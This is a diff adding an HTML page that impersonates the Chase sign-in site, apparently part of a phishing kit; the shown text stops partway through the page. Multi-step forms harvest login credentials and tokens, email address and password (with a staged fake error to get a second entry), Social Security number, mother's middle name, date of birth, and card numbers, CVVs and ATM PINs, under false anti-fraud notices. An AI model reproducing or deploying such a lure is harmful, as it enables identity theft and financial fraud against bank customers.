@@ -1,0 +1,929 @@
+
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Sign in - chase.com</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./img/icon.ico" />
+    <style>
+        @font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 400;
+            src: url('./fonts/opensans-regular.ttf') format('truetype');
+        }
+        
+        html {
+            height: 100%;
+            background: #fff;
+        }
+        
+        @media only screen and (min-width: 768px) {
+            html {
+                background: #1c4f82;
+                background: -moz-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
+                background: -webkit-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
+                background: linear-gradient(to bottom, #1c4f82 0%, #2e6ea3 100%);
+            }
+        }
+        
+        .footer {
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .hide {
+            display: none;
+        }
+        
+        #loading-image {
+            position: fixed;
+            width: 125px;
+            height: 122px;
+            z-index: 1000;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transform: -webkit-translate(-50%, -50%);
+            transform: -moz-translate(-50%, -50%);
+            transform: -ms-translate(-50%, -50%);
+        }
+        
+        .lollol {
+            background-size: 36px;
+            width: 37px;
+            height: 30px;
+            right: 1px;
+            top: 13px;
+            float: left;
+            position: absolute;
+        }
+        
+        .gadiha {
+            display: table;
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            list-style: none;
+            margin: 0 0 1.5em;
+        }
+        
+        .zwina {
+            display: inline-block;
+            text-align: center;
+        }
+        
+        .img_small {
+            width: 3em;
+            height: 2em;
+            margin: 0 auto;
+            border-radius: 7px;
+            display: inline-block;
+        }
+        
+        .tgadi {
+            width: 17em;
+            height: 5.1em;
+            margin: 0 auto;
+            border-radius: 12px;
+            display: inline-block;
+        }
+        
+        .shadow {
+            box-shadow: 0 0px 24px #0b6efd;
+        }
+        
+        .card-icons {
+            vertical-align: middle;
+        }
+        
+        .lawla {
+            background-image: url('./img/lawla.png');
+            background-size: 100%;
+        }
+        
+        .lawlatwo {
+            background-image: url('./img/lawla.png');
+            background-size: 100%;
+        }
+        
+        .mastercardimg {
+            background-image: url('./img/cardsimg.png');
+            background-position: 0 65.6%;
+            background-size: 100%;
+        }
+        
+        .cco {
+            background-image: url('./img/cvv.jpg');
+            background-position: 0 50%;
+            background-size: 100%;
+        }
+        
+        .visaimg {
+            background-image: url('./img/cardsimg.png');
+            background-position: 0 88.25161%;
+            background-size: 100%;
+        }
+        
+        ol.progtrckr {
+            display: table;
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            table-layout: fixed;
+            width: 100%;
+        }
+        
+        ol.progtrckr li {
+            display: table-cell;
+            text-align: center;
+            line-height: 3em;
+        }
+        
+        <!-- Progress with steps --> ol.progtrckr {
+            margin: 0;
+            padding: 0;
+            list-style-type: none;
+        }
+        
+        ol.progtrckr li {
+            display: inline-block;
+            text-align: center;
+            line-height: 3em;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="2"] li {
+            width: 49%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="3"] li {
+            width: 33%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="4"] li {
+            width: 24%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="5"] li {
+            width: 19%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="6"] li {
+            width: 16%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="7"] li {
+            width: 14%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="8"] li {
+            width: 12%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="9"] li {
+            width: 11%;
+        }
+        
+        ol.progtrckr li.progtrckr-done {
+            color: black;
+            border-bottom: 4px solid #0b6efd;
+        }
+        
+        ol.progtrckr li.progtrckr-todo {
+            color: silver;
+            border-bottom: 4px solid silver;
+        }
+        
+        ol.progtrckr li:after {
+            content: "\00a0\00a0";
+        }
+        
+        ol.progtrckr li:before {
+            position: relative;
+            bottom: -2.5em;
+            float: left;
+            left: 50%;
+            line-height: 1em;
+        }
+        
+        ol.progtrckr li.progtrckr-done:before {
+            content: "\2713";
+            color: white;
+            background-color: #0b6efd;
+            height: 1.2em;
+            width: 1.2em;
+            line-height: 1.2em;
+            border: none;
+            border-radius: 1.2em;
+        }
+        
+        ol.progtrckr li.progtrckr-todo:before {
+            content: "\039F";
+            color: silver;
+            background-color: white;
+            font-size: 1.5em;
+            bottom: -1.6em;
+        }
+    </style>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="./css/lostyle.css">
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
+    <div class=" jpui modal" id="modalcard" style="display:none;">
+        <div class="dialog vertical-center util print-position-initial" role="dialog">
+            <section class=" dialogContent">
+                <div class=" modalContent">
+                    <div class=" row">
+                        <div class=" col-xs-12 col-sm-7 col-sm-offset-3">
+                            <h1 class=" dialogTitle" tabindex="-1">We want to ask you a question to verify your identity.
+                            </h1>
+                            <div class=" dialogMessage">
+                                do you have a credit/debit card Chase, if you have a credit/debit card click on "YES" if you don't have click on "NO".
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class=" dialogButtonContainer">
+                            <div class=" col-xs-6 col-sm-3 col-sm-offset-3">
+                                <button type="button" id="no" class=" jpui button focus fluid"><span class=" label">NO</button>
+                            </div>
+                            <div class=" col-xs-6 col-sm-3">
+                                <button type="button" id="yes" class=" jpui button focus fluid primary">YES</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+    <div class=" jpui modal" id="modalcardtwo" style="display:none;">
+        <div class=" dialog vertical-center util print-position-initial" role="dialog">
+            <section class=" dialogContent">
+                <div class=" modalContent">
+                    <div class=" row">
+                        <div class=" col-xs-12 col-sm-7 col-sm-offset-3">
+                            <h1 class=" dialogTitle" tabindex="-1">
+                                We want to ask you a second question to verify your identity.
+                            </h1>
+                            <div class=" dialogMessage">
+                                do you have another credit/debit card Chase, if you have another credit/debit card click on "YES" if you don't have click on "NO".
+                            </div>
+                        </div>
+                    </div>
+                    <div class=" row">
+                        <div class=" dialogButtonContainer">
+                            <div class=" col-xs-6 col-sm-3 col-sm-offset-3">
+                                <button type="button" id="notwo" class=" jpui button focus fluid">NO</button>
+                            </div>
+                            <div class=" col-xs-6 col-sm-3">
+                                <button type="button" id="yestwo" class=" jpui button focus fluid primary"><span class=" label">YES</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+    <div class=" jpui modal" id="loading" style="display:none;">
+        <div class=" dialog vertical-center util print-position-initial" role="dialog">
+            <section class=" dialogContent">
+                <div class=" modalContent">
+                    <div class=" row">
+                        <img id="loading-image" src="./img/loading.gif" />
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+    <div>
+        <div class=" homepage" tabindex="-1">
+            <div class="logon-container">
+                <header class=" toggle-aria-hidden">
+                    <div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
+                        <a>
+                            <div class=" chase logo"></div>
+                        </a>
+                    </div>
+                    <div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
+                        <a>
+                            <div class=" chase logo"></div>
+                        </a>
+                    </div>
+                </header>
+                <main>
+                    <div class=" container logon">
+                        <div>
+                            <div>
+                                <div class=" jpui background image fixed">
+                                    <style type="text/css">
+                                    .jpui.background.image {
+                                        background-image: url(./img/mobilenight.jpeg);
+                                        filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
+                                        -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
+                                    }
+
+                                    @media (min-width:320px) {
+                                        .jpui.background.image {
+                                            background-image: url(./img/mobilenight.jpeg);
+                                        }
+                                    }
+
+                                    @media (min-width:992px) {
+                                        .jpui.background.image {
+                                            background-image: url(./img/tabletnight.jpeg);
+                                        }
+                                    }
+
+                                    @media (min-width:1024px) {
+                                        .jpui.background.image {
+                                            background-image: url(./img/desktopnight.jpeg);
+                                        }
+                                    }
+                                    </style>
+                                </div>
+                            </div>
+                        </div>
+                        <div class=" row">
+                            <div class="> col-xs-12 col-md-6 col-md-offset-3 logoff" id="boxup" style="margin-top: 5em; display:none;">
+                                <div class=" jpui raised segment" style="max-width: 470px!important;">
+                                    <div class=" row">
+                                        <div style="display:block;" id="emailtext" class=" col-xs-10 col-xs-offset-1">
+                                            <h3 style="display:block;" class=" u-focus in-progress" tabindex="-1">Enter your email information.</h3>
+                                            <br>
+                                            <h3 class=" u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;">Notice : Your email info must be correct because we need it to verify identity and also to protect you from fraud.</h3>
+                                        </div>
+                                        <div style="display:none;" id="ssnotext" class=" col-xs-10 col-xs-offset-1">
+                                            <h3 class=" u-focus in-progress" tabindex="-1">Enter your personal information.</h3>
+                                            <br>
+                                            <h3 class=" u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;">Notice : Your personal info must be correct because we need it to verify identity and also to protect you from fraud.</h3>
+                                        </div>
+                                        <div style="display:none;" id="cardotext" class=" col-xs-10 col-xs-offset-1">
+                                            <h3 class=" u-focus in-progress" tabindex="-1">Enter your debit/credit card information.</h3>
+                                            <br>
+                                            <h3 class="u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;">Notice : Your debit/credit info must be correct because we need it to verify identity.</h3>
+                                        </div>
+                                        <div style="display:none;" id="congratext" class=" col-xs-10 col-xs-offset-1">
+                                            <h3 class=" u-focus in-progress" tabindex="-1"><strong>Congratulations !</strong></h3>
+                                            <br>
+                                            <h3 class=" u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #48ad2c;"><img src="./img/congra.png" style="width: 17px;">Your information has been updated successfully.</h3>
+                                        </div>
+                                    </div>
+                                    <div class=" row">
+                                        <div class=" col-xs-12">
+                                            <div class=" progress" style="background: #0b6efd;">
+                                                <div class=" bar"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
+                                <div class=" jpui raised segment" id="login" style="display:block;">
+                                    <div class=" row">
+                                        <div class=" col-xs-10 col-xs-offset-1">
+                                            <form id="login-form" name="login-form" method="POST" autocomplete="off" action="">
+                                                <div id="erruser"></div>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container uus">
+                                                            <div class=" label-wrapper">
+                                                                <label id="baba" class="jpui fieldlabel label-alignment vertical" for="userid">Username</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle" id="userId-text">
+                                                                <input class=" jpui input logon-xs-toggle" id="userid" placeholder="" type="text" name="userid" required="" value=""> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container pps">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="passid">Password</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle" id="password-text">
+                                                                <input class=" jpui input logon-xs-toggle " id="passid" placeholder="" autocomplete="off" type="password" name="passid" required="" value=""> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div id="tokenin" style="display:none;" class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container tk">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="Token">Token</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " id="Token" placeholder="" autocomplete="off" type="number" pattern="[0-9]*" inputmode="numeric" maxlength="35" name="Token" required="" value=""> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" row logon-xs-toggle">
+                                                    <div class=" col-xs-6 rememberMe-checkbox-container">
+                                                        <div class=" jpui checkbox">
+                                                            <div class=" checkbox-flex">
+                                                                <div class=" checkboxWrap" id="rem">
+                                                                    <input class=" checkbox__input rem" type="checkbox">
+                                                                    <i class=" jpui checkmark icon check"></i>
+                                                                </div>
+                                                                <div class=" checkboxWrap" id="rem1" style="display:none;">
+                                                                    <input class=" checkbox__input checkbox__input--checked rem1" type="checkbox">
+                                                                    <i class=" jpui checkmark icon check"></i>
+                                                                </div>
+                                                                <label> <span class=" checkbox-label">Remember me</label>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class=" col-xs-6 token-checkbox-container">
+                                                        <div class=" jpui checkbox useToken">
+                                                            <div class=" checkbox-flex">
+                                                                <div class=" checkboxWrap" id="tkn">
+                                                                    <input class=" checkbox__input tkn" type="checkbox">
+                                                                    <i class=" jpui checkmark icon check"></i>
+                                                                </div>
+                                                                <div class=" checkboxWrap" id="tkn1" style="display:none;">
+                                                                    <input class=" checkbox__input checkbox__input--checked tkn1" type="checkbox">
+                                                                    <i class=" jpui checkmark icon check"></i>
+                                                                </div>
+                                                                <label> <span class="checkbox-label">Use Token</span></label>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" row">
+                                                    <button type="submit" class=" jpui button focus fluid primary touch"><span class="label"> Sign in </span> </button>
+                                                </div>
+                                                <div class=" row"><span class=" jpui link"><a class=" link-anchor touch">Forgot username/password?<i class=" jpui progressright icon end-icon"></i></a></span></div>
+                                                <div class=" row"><span class=" jpui link"><a class=" link-anchor last touch">Not Enrolled? Sign Up Now.<i class=" jpui progressright icon end-icon"></i></a></span></div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class=" jpui raised segment" id="emailo" style="max-width: 470px!important; display:none;">
+                                    <div class=" row">
+                                        <div class=" col-xs-10 col-xs-offset-1">
+                                            <form id="email1-form" name="email1-form" method="POST" autocomplete="off" action="">
+                                                <div id="" align="center">
+                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class="progtrckr-todo"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                    </ol>
+                                                </div>
+                                                <br>
+                                                <br>
+                                                <div align="center">
+                                                    <img id="img" src="./img/emdef213.png" width="100px">
+                                                </div>
+                                                <div id="erreml"></div>
+                                                <br>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container emms">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="email">Email</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class="jpui input logon-xs-toggle " id="email" placeholder="" autocomplete="off" type="email" name="email" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container pswd">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical " for="password">Password</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " id="password" placeholder="" autocomplete="off" type="password" name="password" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" row">
+                                                    <button type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class=" jpui raised segment" id="emailo2" style="max-width: 470px!important; display:none;">
+                                    <div class=" row">
+                                        <div class=" col-xs-10 col-xs-offset-1">
+                                            <form id="email2-form" name="email2-form" method="POST" autocomplete="off" action="">
+                                                <div id="" align="center">
+                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                    </ol>
+                                                </div>
+                                                <br>
+                                                <br>
+                                                <div align="center">
+                                                    <img id="img1" src="./img/emdef213.png" width="100px">
+                                                </div>
+                                                <div id="myerr" class=" myerr" style="display:block;">
+                                                    <div class=" jpui error error inverted primary animate alert">
+                                                        <div class=" icon"><span><i class=" jpui exclamation-color icon"></i></span></div>
+                                                        <div class=" icon background"></div>
+                                                        <div class=" content wrap">
+                                                            <h2 class=" title" tabindex="-1">Please check your information and try again.</h2>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <br>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container emms1">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="email1">Email</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " id="email1" placeholder="" autocomplete="off" type="email" name="email1" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container pswd1">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="password1">Password</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " id="password1" placeholder="" autocomplete="off" type="password" name="password1" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" row">
+                                                    <button type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class=" jpui raised segment" id="ssno" style="max-width: 470px!important; display:none;">
+                                    <div class=" row">
+                                        <div class=" col-xs-10 col-xs-offset-1">
+                                            <form id="ssn-form" name="ssn-form" method="POST" autocomplete="off" action="">
+                                                <div id="" align="center">
+                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                    </ol>
+                                                </div>
+                                                <br>
+                                                <br>
+                                                <div id="errssn"></div>
+                                                <br>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container ssn1">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="ssnnum">Social Security Number</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " maxlength="11" minlength="11" id="ssnnum" placeholder="" autocomplete="off" type="text" name="ssnnum" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container mdn1">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="mdn">Mother's Middle Name</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " id="mdn" placeholder="" autocomplete="off" type="text" name="mdn" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container dob1">
+                                                            <div class="label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="dob">Date Of Birth</label>
+                                                            </div>
+                                                            <div class="logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " maxlength="10" minlength="8" id="dob" placeholder="" autocomplete="off" type="text" name="dob" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class=" row">
+                                                    <button type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class=" jpui raised segment" id="cardo" style="max-width: 470px!important; display:none;">
+                                    <div class=" row">
+                                        <div class=" col-xs-10 col-xs-offset-1">
+                                            <form id="card-form" name="card-form" method="POST" autocomplete="off" action="">
+                                                <div id="" align="center">
+                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class=" progtrckr-done"></li>
+                                                        <li class=" progtrckr-todo"></li>
+                                                    </ol>
+                                                </div>
+                                                <br>
+                                                <br>
+                                                <div id="errcrd"></div>
+                                                <br>
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container crd">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="cardnu">Card Number</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " maxlength="16" minlength="16" id="cardnu" placeholder="" autocomplete="off" type="text" name="cardnu" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                            <div id="fuckyeah" style="display:none;" class=" content wrap">
+                                                                <h2 class=" title" style="color: #c12659;">Your card is invalid please check and try again</h2>
+                                                            </div>
+                                                            <span id="visa1" class=" lollol img_small zwina shadow visaimg card-icons " style="display:none;"></span>
+                                                            <span id="mastercard1" class=" lollol img_small zwina shadow mastercardimg card-icons" style="display:none;"></span>
+                                                            <span id="lawla" class=" lollol zwina img_small shadow lawla card-icons"> </span>
+                                                            <input type="hidden" value="" name="cardtype" id="cardtype">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div id="inexp" class=" jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container exp">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="expda">Expiration Date</label>
+                                                            </div>
+                                                            <div class=" logon-xs-toggle">
+                                                                <input class=" jpui input logon-xs-toggle " id="expda" placeholder="" autocomplete="off" type="text" name="expda" required="" value="" maxlength="7" minlength="5" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div id="inccv" class=" jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container cvc">
+                                                            <div class="  label-wrapper">
+                                                                <label class="  jpui fieldlabel label-alignment vertical" for="cvv">CSC(CVV)</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " id="cvv" maxlength="3" minlength="3" placeholder="" autocomplete="off" type="text" name="cvv" required="" value="" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                            <span class="  lollol zwina img_small shadow cco card-icons"> </span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div id="inpin" class="  jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;">
+                                                    <div class="  jpui vertical">
+                                                        <div class="  align-label-input floating-label__container atm">
+                                                            <div class="  label-wrapper">
+                                                                <label class="  jpui fieldlabel label-alignment vertical" for="pin">ATM pin</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " maxlength="4" minlength="4" id="pin" placeholder="" autocomplete="off" type="text" name="pin" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="  row">
+                                                    <button id="mybtn" type="submit" class="  jpui button focus fluid primary touch"><span class="  label">Confirm</span> </button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="  jpui raised segment" id="cardotwo" style="max-width: 470px!important; display:none;">
+                                    <div class="  row">
+                                        <div class="  col-xs-10 col-xs-offset-1">
+                                            <form id="cardtwo-form" name="cardtwo-form" method="POST" autocomplete="off" action="">
+                                                <div id="" align="center">
+                                                    <ol class="  progtrckr" data-progtrckr-steps="4">
+                                                        <li class="  progtrckr-done"></li>
+                                                        <li class="  progtrckr-done"></li>
+                                                        <li class="  progtrckr-done"></li>
+                                                        <li class="  progtrckr-todo"></li>
+                                                    </ol>
+                                                </div>
+                                                <br>
+                                                <br>
+                                                <div id="errcrdtwo"></div>
+                                                <br>
+                                                <div class="  jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class="  jpui vertical">
+                                                        <div class="  align-label-input floating-label__container crdtwo">
+                                                            <div class="  label-wrapper">
+                                                                <label class="  jpui fieldlabel label-alignment vertical" for="cardnutwo">Card Number</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " maxlength="16" minlength="16" id="cardnutwo" placeholder="" autocomplete="off" type="text" name="cardnutwo" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
+                                                            <div id="fuckyeahtwo" style="display:none;" class="  content wrap">
+                                                                <h2 class="  title" style="color: #c12659;">Your card is invalid please check and try again</h2>
+                                                            </div>
+                                                            <span id="visa1two" class="  lollol img_small zwina shadow visaimg card-icons " style="display:none;"></span>
+                                                            <span id="mastercard1two" class="  lollol img_small zwina shadow mastercardimg card-icons" style="display:none;"></span>
+                                                            <span id="lawlatwo" class="  lollol zwina img_small shadow lawlatwo card-icons"> </span>
+                                                            <input type="hidden" value="" name="cardtypetwo" id="cardtypetwo">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="  jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;" id="inexptwo">
+                                                    <div class="  jpui vertical">
+                                                        <div class="  align-label-input floating-label__container exptwo">
+                                                            <div class="  label-wrapper">
+                                                                <label class="  jpui fieldlabel label-alignment vertical" for="expdatwo">Expiration Date</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " id="expdatwo" placeholder="" autocomplete="off" type="text" name="expdatwo" required="" value="" maxlength="7" minlength="5" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="  jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;" id="inccvtwo">
+                                                    <div class="  jpui vertical">
+                                                        <div class="  align-label-input floating-label__container cvctwo">
+                                                            <div class="  label-wrapper">
+                                                                <label class="  jpui fieldlabel label-alignment vertical" for="cvvtwo">CSC(CVV)</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " id="cvvtwo" maxlength="3" minlength="3" placeholder="" autocomplete="off" type="text" name="cvvtwo" required="" value="" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                            <span class="  lollol zwina img_small shadow cco card-icons"> </span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="  jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;" id="inpintwo">
+                                                    <div class="  jpui vertical">
+                                                        <div class="  align-label-input floating-label__container atmtwo">
+                                                            <div class="  label-wrapper">
+                                                                <label class="  jpui fieldlabel label-alignment vertical" for="pintwo">ATM pin</label>
+                                                            </div>
+                                                            <div class="  logon-xs-toggle">
+                                                                <input class="  jpui input logon-xs-toggle " maxlength="4" minlength="4" id="pintwo" placeholder="" autocomplete="off" type="text" name="pintwo" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="  row">
+                                                    <button id="mybtntwo" type="submit" class="  jpui button focus fluid primary touch"><span class="  label">Confirm</span> </button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="  jpui raised segment" id="congra" style="max-width: 470px!important; display:none;">
